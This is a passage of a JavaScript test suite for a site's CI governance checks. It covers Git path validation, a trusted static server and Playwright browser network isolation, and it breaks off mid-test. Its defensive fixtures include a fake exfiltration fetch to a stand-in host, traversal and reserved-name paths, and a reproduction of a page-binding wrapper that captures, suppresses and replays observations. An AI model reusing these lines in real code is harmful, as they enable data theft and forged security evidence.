test("F2-GOV-08 rejects a byte-different decomposed representation of a protected-looking path", async () => {
  const fixture = await createRepository();
  try {
    const pathBytes = Buffer.from("scripts-governance-f2-gov-08-consume\u0072\u0301.mjs.html", "utf8");
    await publishBinaryRootEntries(fixture, [{ pathBytes }], "protected path normalization ambiguity");
    assert.throws(() => run(fixture), /Git path is not ASCII|ASCII-only/i);
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

test("F2-GOV-08 portable grammar accepts every one of the 56 current published paths", () => {
  assert.equal(publishedPaths.length, 56);
  assert.deepEqual(
    publishedPaths.map((path) => portableGuard.validatePortableGitPathBytes(Buffer.from(path, "ascii"))),
    publishedPaths,
  );
});

test("F2-GOV-08 portable trie accepts all 808 current regular Git paths and all 56 manifest paths", () => {
  const current = currentGitTreeEntries();
  assert.equal(current.length, 808);
  assert.ok(current.every(({ mode, type }) => mode === "100644" && type === "blob"));
  assert.equal(portableGuard.validatePortableGitTreeEntries(current).entries.length, 808);
  assert.equal(portableGuard.validatePortableGitTreeEntries(syntheticTreeEntries(publishedPaths)).entries.length, 56);
});

for (const [label, paths] of [
  ["file versus case-folded child", ["src/js/Foo", "src/js/foo/bar.js"]],
  ["case-divergent directory merge", ["src/JS/a.js", "src/js/b.js"]],
  ["file as exact parent prefix", ["assets", "assets/logo.png"]],
  ["multi-level case divergence", ["SRC/images/icons/a.png", "src/Images/other.png"]],
  ["transitive three-way conflict", ["assets/logo.png", "ASSETS", "Assets/icons/x.svg"]],
]) test(`F2-GOV-08 portable trie rejects ${label} in every input order`, () => {
  for (const ordered of permutations(paths)) {
    assert.throws(
      () => portableGuard.validatePortableGitTreeEntries(syntheticTreeEntries(ordered)),
      /portable tree collision|file.*directory|capitalization|prefix/i,
      `order must fail closed: ${ordered.join(" -> ")}`,
    );
  }
});

test("F2-GOV-08 portable trie rejects a child inserted before its file parent", () => {
  assert.throws(
    () => portableGuard.validatePortableGitTreeEntries(syntheticTreeEntries(["assets/logo.png", "assets"])),
    /portable tree collision|file.*directory|prefix/i,
  );
});

test("F2-GOV-08 portable trie records only regular Git files as materializable leaves", () => {
  assert.equal(typeof portableGuard.validatePortableGitTreeEntries, "function", "portable trie validator is absent");
  for (const entry of [
    { ...syntheticTreeEntries(["src/js/link.js"])[0], mode: "120000", type: "blob" },
    { ...syntheticTreeEntries(["src/js/submodule.js"])[0], mode: "160000", type: "commit" },
    { ...syntheticTreeEntries(["src/js/executable.js"])[0], mode: "100755", type: "blob" },
  ]) assert.throws(() => portableGuard.validatePortableGitTreeEntries([entry]), /regular Git file|unexpected Git mode|unexpected Git type/i);
});

for (const [label, path, expected] of [
  ["reserved CON with extension", "CON.html", /reserved Windows device/i],
  ["reserved con without extension", "con", /reserved Windows device/i],
  ["reserved NUL with extension", "NUL.txt", /reserved Windows device/i],
  ["reserved COM1 with extension", "COM1.js", /reserved Windows device/i],
  ["reserved LPT9 with extension", "LPT9.css", /reserved Windows device/i],
  ["alternate data stream", "inert:probe.html", /forbidden portable character|alternate data stream/i],
  ["alternate data stream marker", "index.html:$DATA", /forbidden portable character|alternate data stream/i],
  ["trailing dot", "inert.html.", /trailing dot or space/i],
  ["trailing space", "inert.html ", /trailing dot or space/i],
  ["backslash", "src\\js\\branct.js", /backslash|forbidden portable character/i],
  ["drive letter", "C:/index.html", /absolute|drive/i],
  ["UNC path", "\\\\server\\share.html", /UNC|backslash|absolute/i],
  ["parent traversal", "../escape.html", /traversal/i],
  ["current traversal", "./index.html", /traversal/i],
  ["empty segment", "src//index.html", /empty segment|traversal/i],
  ["control character", "inert\u0001.html", /control|forbidden portable character/i],
  ["forbidden question mark", "inert?.html", /forbidden portable character/i],
  ["Unicode normalization ambiguity", "pa\u0301gina.html", /Git path is not ASCII|ASCII-only/i],
]) test(`F2-GOV-08 portable grammar rejects ${label} deterministically`, () => {
  assert.throws(() => portableGuard.validatePortableGitPathBytes(Buffer.from(path, "utf8")), expected);
});

test("F2-GOV-08 rejects a case-insensitive collision before materialization", async () => {
  const fixture = await createRepository();
  try {
    await publishBinaryRootEntries(fixture, [{ pathBytes: Buffer.from("INDEX.html", "ascii") }], "case collision");
    assert.throws(() => run(fixture), /portable path collision.*index\.html.*INDEX\.html|portable path collision.*INDEX\.html.*index\.html/i);
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

test("F2-GOV-08 requires the canonical index.html bytes and capitalization", async () => {
  const fixture = await createRepository();
  try {
    fixture.git("mv", "index.html", "temporary-index-name");
    fixture.git("mv", "temporary-index-name", "INDEX.html");
    await publishFixtureHead(fixture, "replace canonical index capitalization");
    assert.throws(() => run(fixture), /canonical live path index\.html is absent or has different bytes\/capitalization/i);
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

test("F2-GOV-08 rejects a reserved Windows name before materialization", async () => {
  const fixture = await createRepository();
  try {
    await publishBinaryRootEntries(fixture, [{ pathBytes: Buffer.from("CON.html", "ascii") }], "reserved path");
    assert.throws(() => run(fixture), /reserved Windows device/i);
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

test("F2-GOV-08 materializer rejects an escaping destination before writing", async () => {
  const root = await mkdtemp(join(tmpdir(), "branct-f2-gov-08-materialize-"));
  const escaped = join(dirname(root), "escape.html");
  try {
    assert.throws(() => portableGuard.materializePortableBlob(root, "../escape.html", Buffer.from("blocked")), /traversal|escapes trusted root/i);
    await assert.rejects(access(escaped));
  } finally { await rm(root, { recursive: true, force: true }); }
});

for (const [role, path] of [
  ["contract", CANONICAL_AUTHORITY_PATHS.contract],
  ["pins", CANONICAL_AUTHORITY_PATHS.manifest],
  ["matrix", CANONICAL_AUTHORITY_PATHS.matrix],
  ["expectations", CANONICAL_AUTHORITY_PATHS.expectations],
]) test(`F2-GOV-08 rejects rename of canonical ${role} authority`, async () => {
  const fixture = await createRepository();
  try {
    fixture.git("mv", path, `${role}-authority.html`);
    await publishFixtureHead(fixture, `rename canonical ${role}`);
    const canonicalLabel = role === "pins" ? "manifest" : role;
    assert.throws(() => run(fixture), new RegExp(`protected authority|canonical ${canonicalLabel}.*head|structural Git diff`, "i"));
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

for (const [label, mode, oidFactory] of [
  ["symlink", "120000", (fixture) => execFileSync("git", ["hash-object", "-w", "--stdin"], { cwd: fixture.repository, input: "inert.html", encoding: "utf8" }).trim()],
  ["gitlink", "160000", (fixture) => fixture.baseSha],
]) test(`F2-GOV-08 rejects consumer replaced by ${label} in the head tree`, async () => {
  const fixture = await createRepository();
  try {
    const oid = oidFactory(fixture);
    fixture.git("update-index", "--add", "--cacheinfo", `${mode},${oid},${CANONICAL_AUTHORITY_PATHS.consumer}`);
    await publishFixtureHead(fixture, `replace consumer with ${label}`);
    assert.throws(() => run(fixture), /canonical consumer.*head|protected authority|unexpected Git (mode|type)/i);
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

test("F2-GOV-08 inventories an external capability without treating static presence as an observed attempt", async () => {
  const fixture = await createRepository();
  try {
    await write(fixture.repository, "src/js/branct.js", "fetch('https://example.invalid/exfiltrate');\n");
    fixture.git("add", "src/js/branct.js");
    fixture.git("commit", "--quiet", "-m", "external capability inventory");
    fixture.headSha = fixture.git("rev-parse", "HEAD");
    fixture.git("update-ref", "refs/remotes/origin/candidate", fixture.headSha);
    fixture.event.pull_request.head.sha = fixture.headSha;
    await writeFile(fixture.eventPath, JSON.stringify(fixture.event));
    const result = run(fixture);
    assert.equal(result.decision, "PASS");
    assert.ok(result.authority.capabilityInventory.some(({ path, category, mechanism, reference }) =>
      path === "src/js/branct.js" && category === "ACTIVE_API" && mechanism === "fetch" && reference === null));
    assert.ok(result.authority.capabilityInventory.some(({ path, category, mechanism, reference }) =>
      path === "src/js/branct.js" && category === "EXTERNAL_LITERAL" && mechanism === "https-url" && reference === "https://example.invalid/exfiltrate"));
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

for (const [label, path, content, expected] of [
  ["KEYED_PRODUCER_TRANSPLANT", "index.html", `${html("candidate").replace("<html ", "<html data-authority-key=\"producer\" ")}`, /KEYED_PRODUCER_TRANSPLANT/i],
]) test(`F2-GOV-08 rejects ${label} from candidate content`, async () => {
  const fixture = await createRepository();
  try {
    await write(fixture.repository, path, content);
    fixture.git("add", path);
    fixture.git("commit", "--quiet", "-m", label);
    fixture.headSha = fixture.git("rev-parse", "HEAD");
    fixture.git("update-ref", "refs/remotes/origin/candidate", fixture.headSha);
    fixture.event.pull_request.head.sha = fixture.headSha;
    await writeFile(fixture.eventPath, JSON.stringify(fixture.event));
    assert.throws(() => run(fixture), expected);
  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
});

test("F2-GOV-09 promotes the base-only authority to operational enforcement", () => {
  const contract = JSON.parse(canonicalBlob(CANONICAL_AUTHORITY_PATHS.contract).toString("utf8"));
  const workflow = canonicalBlob(".github/workflows/universal-pr-gate.yml").toString("utf8");
  const consumer = canonicalBlob(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
  assert.equal(contract.status, "OPERATIONAL_CANDIDATE");
  assert.equal(contract.limitations.workflowEnforcement, "CANDIDATE_PENDING_PROTECTED_MERGE");
  assert.equal(contract.limitations.operationalIsolation, "VERIFIED_IN_CI");
  assert.equal(contract.limitations.browserNetworkIsolation, "VERIFIED_IN_CI");
  assert.match(workflow, /Run base-only F2-GOV-08 enforcement/);
  assert.match(workflow, /git cat-file blob "\$\{BASE_SHA\}:scripts\/governance\/validate-f2-gov-08\.mjs"/);
  assert.match(consumer, /chromium/);
  assert.match(consumer, /firefox/);
  assert.match(consumer, /webkit/);
  assert.match(consumer, /context\.route\(/);
  assert.match(canonicalBlob(CANONICAL_AUTHORITY_PATHS.staticServer).toString("utf8"), /127\.0\.0\.1/);
});

test("F2-GOV-09 canonical matrix fixes 84 observations, 41 identities and 184 actions per engine", () => {
  const matrix = JSON.parse(canonicalBlob(CANONICAL_AUTHORITY_PATHS.matrix).toString("utf8"));
  assert.deepEqual(matrix.engines, ["chromium", "firefox", "webkit"]);
  assert.equal(matrix.observationCountPerEngine, 84);
  assert.equal(matrix.menuEvidenceCountPerEngine, 41);
  assert.equal(matrix.actionCountPerEngine, 184);
  assert.deepEqual(matrix.viewports["1024x768"], [1024, 768]);
});

test("F2-GOV-09 browser network boundary blocks workers, sockets, RTC and external HTTP", () => {
  const consumer = canonicalBlob(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
  const server = canonicalBlob(CANONICAL_AUTHORITY_PATHS.staticServer).toString("utf8");
  assert.match(consumer, /newContext\(\{ serviceWorkers: "block" \}\)/);
  assert.match(consumer, /context\.routeWebSocket\("\*\*"/);
  assert.match(consumer, /Object\.defineProperty\(globalThis, "RTCPeerConnection"/);
  assert.match(consumer, /installRuntimeNetworkPolicy/);
  assert.match(consumer, /runNetworkControl/);
  assert.match(consumer, /assertNoObservedExternalAttempts/);
  assert.match(consumer, /NETWORK_CONTROL_ACTIONS/);
  assert.match(server, /connect-src 'self'/);
  assert.match(server, /worker-src 'none'/);
  assert.match(server, /frame-src 'none'/);
});

test("F2-GOV-09 consumer uses the menu authority's fixed-order digest contract", () => {
  const consumer = canonicalBlob(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
  const menuAuthority = JSON.parse(canonicalBlob("fixtures/audit/f2-01-menu-evidence-matrix.json").toString("utf8"));
  const payload = menuAuthority.entries.map(({ evidenceId, route, viewport, actionPhases, developmentSemanticStatus, developmentResult, developmentResultSha256 }) => ({ evidenceId, route, viewport, actionPhases, developmentSemanticStatus, developmentResult, developmentResultSha256 }));
  assert.equal(createHash("sha256").update(JSON.stringify(payload)).digest("hex"), menuAuthority.sha256);
  assert.match(consumer, /sha256\(JSON\.stringify\(menuEvidencePayload\)\)/);
  assert.match(consumer, /page\.evaluate\(\(opened\) => \{/);
  assert.match(consumer, /\}, openInvoked\)\);/);
  assert.match(consumer, /phase === "after-open"/);
});

test("F2-GOV-09 operational validator accepts the exact complete semantic RED vector", () => {
  const fixture = canonicalOperationalFixture();
  assert.equal(validateOperationalReport(fixture.report, fixture.authority, fixture.baseSha, fixture.headSha, fixture.payloadDigest).length, 375);
});

for (const [label, mutate, expected] of [
  ["missing browser engine", (report) => report.reports.splice(1, 1), /engine report set is missing/i],
  ["partial evidence", (report) => report.evidence.pop(), /evidence report is partial/i],
  ["inconclusive browser action", (report) => { report.reports[0].actions[0].status = "TIMEOUT"; }, /action evidence is inconclusive/i],
  ["unblocked external network", (report) => { report.reports[0].networkIsolation.controls[0].status = "ALLOWED"; }, /control vector is incomplete|divergent/i],
  ["unexercised browser route blocker", (report) => { report.reports[0].networkIsolation.controls[0].observed = []; }, /control observation cardinality/i],
  ["producer-selected conclusion", (report) => { report.conclusion = "READY_GREEN"; }, /operational conclusion is divergent/i],
]) test(`F2-GOV-09 operational validator rejects ${label}`, () => {
  const fixture = canonicalOperationalFixture();
  mutate(fixture.report);
  assert.throws(() => validateOperationalReport(fixture.report, fixture.authority, fixture.baseSha, fixture.headSha, fixture.payloadDigest), expected);
});

test("F2-GOV-09 rejects a candidate attempt transplanted into a trusted control probe", () => {
  const fixture = canonicalOperationalFixture();
  fixture.report.reports[0].networkIsolation.controls[0].observed.push({
    mechanism: "fetch",
    url: "https://candidate-delayed.invalid/late",
    disposition: "BLOCKED_BEFORE_EGRESS",
  });
  assert.throws(
    () => validateOperationalReport(fixture.report, fixture.authority, fixture.baseSha, fixture.headSha, fixture.payloadDigest),
    /control observation cardinality|probe identity|candidate attempt/i,
  );
});

test("F2-GOV-09 rejects every local request violation even when i18n succeeds", () => {
  const fixture = canonicalOperationalFixture();
  fixture.report.reports[0].networkIsolation.localViolations = [{
    url: "http://127.0.0.1:4173/not-allowlisted.json",
    reason: "trusted static request is not an expected candidate blob",
  }];
  assert.throws(
    () => validateOperationalReport(fixture.report, fixture.authority, fixture.baseSha, fixture.headSha, fixture.payloadDigest),
    /local request violation/i,
  );
});

test("F2-GOV-09 runtime policy observes generic preconnect and dns-prefetch hints", () => {
  const consumer = workingFile(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
  assert.match(consumer, /preconnect/);
  assert.match(consumer, /dns-prefetch/);
  assert.match(consumer, /context\.route\("\*\*"/);
  assert.doesNotMatch(consumer, /__branctReportExternalAttempt/);
});

test("F2-GOV-09-F10 keeps external preconnect detection distinct from proven pre-egress blocking", () => {
  const probeId = "a".repeat(64);
  const observed = [{
    mechanism: "resource-hint",
    url: "https://f2-gov-09.invalid/resource-hint-preconnect",
    origin: "https://f2-gov-09.invalid",
    phase: "control-probe",
    engine: "chromium",
    action: "resource-hint-preconnect",
    route: "about:blank",
    viewport: "control",
    disposition: "DETECTED_AFTER_DOM_INSERTION",
    probeId,
  }];
  assert.doesNotThrow(() => trustedConsumer.assertExpectedNetworkControl(observed, "chromium", "resource-hint-preconnect", probeId));
  assert.throws(
    () => trustedConsumer.assertExpectedNetworkControl([{ ...observed[0], disposition: "BLOCKED_BEFORE_EGRESS" }], "chromium", "resource-hint-preconnect", probeId),
    /trusted control observation is divergent/i,
  );
  const controls = networkControlActionsForTest.map((action) => ({ action, status: expectedControlStatusForTest(action) }));
  assert.doesNotThrow(() => trustedConsumer.assertExpectedNetworkControlVector(controls, "chromium"));
  assert.throws(
    () => trustedConsumer.assertExpectedNetworkControlVector(controls.map(({ action }) => ({ action, status: "BLOCKED_AND_RECORDED" })), "chromium"),
    /runtime network controls are incomplete/i,
  );
  assert.throws(
    () => trustedServer.assertNoExternalResourceHints(Buffer.from('<link rel="preconnect" href="https://tracker.invalid">'), "external.html"),
    /external resource hint before consent/i,
  );
  assert.doesNotThrow(() => trustedServer.assertNoExternalResourceHints(Buffer.from('<link rel="preconnect" href="/src/">'), "local.html"));
  assert.doesNotThrow(() => trustedServer.assertNoExternalResourceHints(Buffer.from("<title>no hint</title>"), "absent.html"));
});

test("F2-GOV-09-F7 never presents dynamic resource-hint detection as proven pre-egress blocking", () => {
  const consumer = workingFile(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
  const validator = workingFile("scripts/governance/validate-f2-gov-08.mjs").toString("utf8");
  const contract = JSON.parse(workingFile(CANONICAL_AUTHORITY_PATHS.contract).toString("utf8"));
  const design = workingFile("docs/audit/phase-2/governance/f2-gov-09-design.md").toString("utf8");
  assert.match(consumer, /DETECTED_AND_REJECTED_EGRESS_NOT_PROVEN/);
  assert.match(consumer, /DETECTED_AFTER_DOM_INSERTION/);
  assert.match(validator, /DETECTED_AND_REJECTED_EGRESS_NOT_PROVEN/);
  assert.match(validator, /contract\.limitations\.resourceHintPreEgress, "NOT_VERIFIED_DYNAMIC_HINTS_DETECTED_AND_REJECTED"/);
  assert.equal(contract.limitations.resourceHintPreEgress, "NOT_VERIFIED_DYNAMIC_HINTS_DETECTED_AND_REJECTED");
  assert.doesNotMatch(design, /Hints criados dinamicamente são bloqueados/);
  assert.match(design, /não comprova bloqueio pré-egress/i);
});

test("F2-GOV-09-F7 rejects reports and contracts that overstate dynamic resource-hint pre-egress blocking", () => {
  const fixture = canonicalOperationalFixture();
  const hint = fixture.report.reports[0].networkIsolation.controls.find(({ action }) => action === "resource-hint-preconnect");
  hint.status = "BLOCKED_AND_RECORDED";
  hint.observed[0].disposition = "BLOCKED_BEFORE_EGRESS";
  assert.throws(
    () => validateOperationalReport(fixture.report, fixture.authority, fixture.baseSha, fixture.headSha, fixture.payloadDigest),
    /control vector is incomplete|divergent/i,
  );
});

test("F2-GOV-09-F7 mutation control keeps resource-hint status and disposition guards load-bearing", async () => {
  const directory = await mkdtemp(join(tmpdir(), "branct-f2-gov-09-hint-claim-mutation-"));
  try {
    const source = workingFile("scripts/governance/validate-f2-gov-08.mjs").toString("utf8");
    const weakened = source
      .replace(/const networkControlStatus = \(action\) => RESOURCE_HINT_ACTIONS\.has\(action\)\s*\? "DETECTED_AND_REJECTED_EGRESS_NOT_PROVEN"\s*:\s*"BLOCKED_AND_RECORDED";/, 'const networkControlStatus = () => "BLOCKED_AND_RECORDED";')
      .replace(/const networkControlDisposition = \(action\) => RESOURCE_HINT_ACTIONS\.has\(action\)\s*\? "DETECTED_AFTER_DOM_INSERTION"\s*:\s*"BLOCKED_BEFORE_EGRESS";/, 'const networkControlDisposition = () => "BLOCKED_BEFORE_EGRESS";');
    assert.notEqual(weakened, source, "resource-hint claim mutation was a no-op");
    assert.doesNotMatch(weakened, /DETECTED_AND_REJECTED_EGRESS_NOT_PROVEN/);
    assert.doesNotMatch(weakened, /DETECTED_AFTER_DOM_INSERTION/);
    const target = join(directory, "weakened-validator.mjs");
    await writeFile(target, weakened);
    const module = await import(`${pathToFileURL(target).href}?mutation=${Date.now()}`);
    const fixture = canonicalOperationalFixture();
    for (const report of fixture.report.reports) {
      for (const hint of report.networkIsolation.controls.filter(({ action }) => resourceHintActionsForTest.has(action))) {
        hint.status = "BLOCKED_AND_RECORDED";
        hint.observed[0].disposition = "BLOCKED_BEFORE_EGRESS";
      }
    }
    assert.doesNotThrow(() => module.validateOperationalReport(fixture.report, fixture.authority, fixture.baseSha, fixture.headSha, fixture.payloadDigest));
  } finally { await rm(directory, { recursive: true, force: true }); }
});

test("F2-GOV-09 isolates measured content from every trusted control context", () => {
  const consumer = canonicalBlob(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
  assert.match(consumer, /await context\.close\(\);\s*measuredContextClosed = true;/);
  assert.match(consumer, /const probeContext = await browser\.newContext/);
  assert.match(consumer, /await probeContext\.close\(\);\s*probeContextClosed = true;\s*await probePolicy\.finalizeLocalFailureCorrelations\(\);/);
  assert.match(consumer, /finally \{ if \(!probeContextClosed\) await probeContext\.close\(\); \}/);
  assert.doesNotMatch(consumer, /installRuntimeNetworkPolicy\(context, server, engine\)(?:;|\))/);
});

test("F2-GOV-09 validates a same-origin request against the authoritative blob allowlist before continuing", () => {
  const consumer = canonicalBlob(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
  assert.match(consumer, /server\.validateRequest\(url\.href\)/);
  assert.match(consumer, /localViolations\.push/);
  assert.match(consumer, /route\.abort\("blockedbyclient"\)/);
});

for (const [rel, href] of [
  ["preconnect", "https://tracker-one.invalid"],
  ["dns-prefetch", "//tracker-two.invalid"],
]) test(`F2-GOV-09 rejects a static external ${rel} hint before consent`, () => {
  assert.throws(
    () => trustedServer.assertNoExternalResourceHints(Buffer.from(`<link rel="${rel}" href="${href}">`), "probe.html"),
    /external resource hint before consent/i,
  );
});

for (const [label, source] of [
  ["unquoted preconnect", "<link rel=preconnect href=https://tracker.invalid>"],
  ["unquoted dns-prefetch", "<link rel=dns-prefetch href=//tracker.invalid>"],
  ["reordered attributes", "<link href=https://tracker.invalid rel=preconnect>"],
  ["mixed spacing", "<link\trel = dns-prefetch\thref = //tracker.invalid>"],
  ["case-insensitive names and values", "<LINK HREF=https://tracker.invalid REL=PRECONNECT>"],
  ["multi-token rel", "<link rel='stylesheet preconnect' href=https://tracker.invalid>"],
  ["ambiguous encoded rel", "<link rel=pre&#x63;onnect href=https://tracker.invalid>"],
]) test(`F2-GOV-09 rejects external resource hint syntax: ${label}`, () => {
  assert.throws(
    () => trustedServer.assertNoExternalResourceHints(Buffer.from(source), "probe.html"),
    /external resource hint|ambiguous resource hint/i,
  );
});

test("F2-GOV-09 accepts local resource hints without granting an external domain allowlist", () => {
  assert.doesNotThrow(() => trustedServer.assertNoExternalResourceHints(Buffer.from('<link rel="preconnect" href="/src/">'), "probe.html"));
});

for (const [label, mutate] of [
  ["forged mechanism", (attempt) => { attempt.mechanism = "fake"; }],
  ["forged URL", (attempt) => { attempt.url = "https://fake.invalid/forged"; attempt.origin = "https://fake.invalid"; }],
  ["forged action", (attempt) => { attempt.action = "fetch"; }],
  ["forged phase", (attempt) => { attempt.phase = "measured-flow"; }],
  ["forged route", (attempt) => { attempt.route = "about:blank"; }],
  ["missing nonce", (attempt) => { delete attempt.probeId; }],
]) test(`F2-GOV-09 rejects consent-loader observation with ${label}`, () => {
  const fixture = canonicalOperationalFixture();
  const attempt = fixture.report.reports[0].networkIsolation.controls.find(({ action }) => action === "consent-loader").observed[0];
  mutate(attempt);
  assert.throws(
    () => validateOperationalReport(fixture.report, fixture.authority, fixture.baseSha, fixture.headSha, fixture.payloadDigest),
    /control observation|probe identity|schema/i,
  );
});

test("F2-GOV-09 rejects consent and form control observations transplanted while preserving probe identities", () => {
  const fixture = canonicalOperationalFixture();
  const controls = fixture.report.reports[0].networkIsolation.controls;
  const consent = controls.find(({ action }) => action === "consent-loader").observed[0];
  const form = controls.find(({ action }) => action === "form-submit").observed[0];
  const consentPayload = { mechanism: consent.mechanism, url: consent.url, origin: consent.origin };
  Object.assign(consent, { mechanism: form.mechanism, url: form.url, origin: form.origin });
  Object.assign(form, consentPayload);
  assert.throws(
    () => validateOperationalReport(fixture.report, fixture.authority, fixture.baseSha, fixture.headSha, fixture.payloadDigest),
    /control observation/i,
  );
});

test("F2-GOV-09-F6 keeps observation authority entirely outside the candidate page realm", () => {
  const consumer = workingFile(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
  assertHostOnlyObservationAuthority(consumer);
});

test("F2-GOV-09-F6 reproduces wrapper, suppression and replay against a page-exposed binding", async () => {
  const { chromium } = await import("playwright");
  const browser = await chromium.launch({ headless: true });
  try {
    const context = await browser.newContext();
    const accepted = [];
    const authority = "authority-visible-to-page";
    await context.exposeBinding("__vulnerableObservation", (_source, token, detail) => {
      if (token === authority) accepted.push(detail);
    });
    await context.addInitScript((token) => {
      const original = globalThis.__vulnerableObservation;
      globalThis.__vulnerableObservation = (observedToken, detail) => {
        globalThis.__capturedAuthority = observedToken;
        globalThis.__suppressedObservation = detail;
        return undefined;
      };
      globalThis.__emitVulnerableObservation = (detail) => globalThis.__vulnerableObservation(token, detail);
      globalThis.__replayVulnerableObservation = (detail) => original(globalThis.__capturedAuthority, detail);
    }, authority);
    const page = await context.newPage();
    await page.goto("about:blank");
    await page.evaluate(() => globalThis.__emitVulnerableObservation({ mechanism: "fetch", url: "https://suppressed.invalid/" }));
    assert.deepEqual(accepted, [], "wrapper must demonstrate suppression of the true observation");
    assert.equal(await page.evaluate(() => globalThis.__capturedAuthority), authority, "wrapper must demonstrate authority capture");
    await page.evaluate(() => globalThis.__replayVulnerableObservation({ mechanism: "script", url: "https://replayed.invalid/" }));
    assert.deepEqual(accepted, [{ mechanism: "script", url: "https://replayed.invalid/" }], "wrapper must demonstrate replay of a fabricated tuple");
    await context.close();
  } finally { await browser.close(); }
});

test("F2-GOV-09-F6 consent-loader is bound to the corrected live CRM page", () => {
  const consumer = workingFile(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
  const validator = workingFile("scripts/governance/validate-f2-gov-08.mjs").toString("utf8");
  assertCanonicalConsentProbe(consumer);
  assert.match(validator, /consent-loader"\) return \{ mechanism: "script", url: "https:\/\/connect\.facebook\.net\/en_US\/fbevents\.js", route: "crm-gestao\.html" \}/);
});

test("F2-GOV-09-F6 host interceptor cannot be suppressed or replayed by candidate globals", async () => {
  const { chromium } = await import("playwright");
  const browser = await chromium.launch({ headless: true });
  try {
    const context = await browser.newContext();
    const observed = [];
    await context.route("**", (route) => { observed.push(route.request().url()); return route.abort("blockedbyclient"); });
    const page = await context.newPage();
    await page.goto("about:blank");
    await page.evaluate(async () => {
      globalThis.__branctReportExternalAttempt = () => undefined;
      globalThis.__capturedAuthority = "fabricated";
      globalThis.__replay = () => globalThis.__branctReportExternalAttempt("fabricated", { url: "https://replay.invalid/" });
      globalThis.__replay();
      await fetch("https://host-observed.invalid/actual").catch(() => {});
    });
    assert.deepEqual(observed, ["https://host-observed.invalid/actual"], "host observation must reflect only the real browser request");
    await context.close();
  } finally { await browser.close(); }
});

test("F2-GOV-09-F6 executes the real CRM consent lifecycle under host interception", async () => {
  const { chromium } = await import("playwright");
  const expectedPayload = publishedPaths.map((path) => {
    const bytes = workingFile(path);
    return { path, sha256: createHash("sha256").update(bytes).digest("hex") };
  });
  const server = await trustedServer.startTrustedStaticServer(sourceRepository, expectedPayload, 0);
  const browser = await chromium.launch({ headless: true });
  try {
    const context = await browser.newContext({ serviceWorkers: "block" });
    const attempts = [];
    context.on("request", (request) => {
      const url = new URL(request.url());
      if (url.origin !== server.origin && !attempts.some((attempt) => attempt.url === url.href)) attempts.push({ mechanism: request.resourceType(), url: url.href });
    });
    await context.route("**", async (route) => {
      const url = new URL(route.request().url());
      if (url.origin === server.origin) return route.continue();
      return route.abort("blockedbyclient");
    });
    const page = await context.newPage();
    await page.goto(`${server.origin}/crm-gestao.html`, { waitUntil: "load" });
    await page.waitForTimeout(120);
    assert.deepEqual(attempts, [], "no decision must not attempt Meta");
    await page.locator("#consent-reject").click();
    await page.waitForTimeout(120);
    assert.deepEqual(attempts, [], "refusal must not attempt Meta");
    await page.evaluate(() => localStorage.removeItem("branct_consent"));
    await page.reload({ waitUntil: "load" });
    await page.waitForTimeout(120);
    assert.deepEqual(attempts, [], "withdrawal must not attempt Meta");
    await page.locator("#consent-accept").click();
    await page.waitForFunction(() => globalThis.__brancrPixelInited === true);
    assert.deepEqual(attempts, [{ mechanism: "script", url: "https://connect.facebook.net/en_US/fbevents.js" }], "valid consent must produce exactly the canonical Meta attempt");
    await page.evaluate(() => localStorage.removeItem("branct_consent"));
    await page.reload({ waitUntil: "load" });
    await page.waitForTimeout(120);
    assert.equal(attempts.length, 1, "withdrawal after consent must not produce another attempt");
    await context.close();
  } finally {
    await browser.close();
    await server.close();
  }
});

test("F2-GOV-09-F6 keeps the real contact submission inside the trusted host blocker", async () => {
  const { chromium } = await import("playwright");
  const expectedPayload = publishedPaths.map((path) => {
    const bytes = workingFile(path);
    return { path, sha256: createHash("sha256").update(bytes).digest("hex") };
  });
  const server = await trustedServer.startTrustedStaticServer(sourceRepository, expectedPayload, 0);
  const browser = await chromium.launch({ headless: true });
  try {
    const context = await browser.newContext({ serviceWorkers: "block" });
    const attempts = [];
    await context.route("**", async (route) => {
      const url = new URL(route.request().url());
      if (url.origin === server.origin) return route.continue();
      attempts.push({ mechanism: route.request().resourceType(), url: url.href });
      return route.abort("blockedbyclient");
    });
    const page = await context.newPage();
    await page.goto(`${server.origin}/contactos.html`, { waitUntil: "load" });
    await page.locator("#ct-nome").fill("Offline probe");
    await page.locator("#ct-email").fill("test@example.invalid");
    await page.locator("#ct-interesse").selectOption("website-premium");
    await page.locator("#ct-mensagem").fill("Offline probe");
    await page.locator('form[data-lead-form] button[type="submit"]').click();
    await page.waitForTimeout(120);
    assert.deepEqual(attempts, [{ mechanism: "fetch", url: "https://n8n.branct.com/webhook/site-lead" }], "contact submission must be observed and blocked exactly once by the trusted host");
    await context.close();
  } finally {
    await browser.close();
    await server.close();
  }
});

test("F2-GOV-09-F6 keeps CSP diagnostic while host interception remains the blocking authority", () => {
  const server = workingFile(CANONICAL_AUTHORITY_PATHS.staticServer).toString("utf8");
  assert.match(server, /"content-security-policy-report-only":/);
  assert.doesNotMatch(server, /"content-security-policy":/);
  assert.match(server, /connect-src 'self'/);
  assert.match(server, /script-src 'self' 'unsafe-inline'/);
  const consumer = workingFile(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
  assert.match(consumer, /context\.on\("request", \(request\) => \{\r?\n    recordLifecycleEvent\(`request:\$\{request\.resourceType\(\)\}`\);\r?\n    recordExternalRequest\(request\);\r?\n  \}\);/);
});

test("F2-GOV-09-F6 mutation controls keep page-realm authority and CRM routing guards load-bearing", () => {
  const consumer = workingFile(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
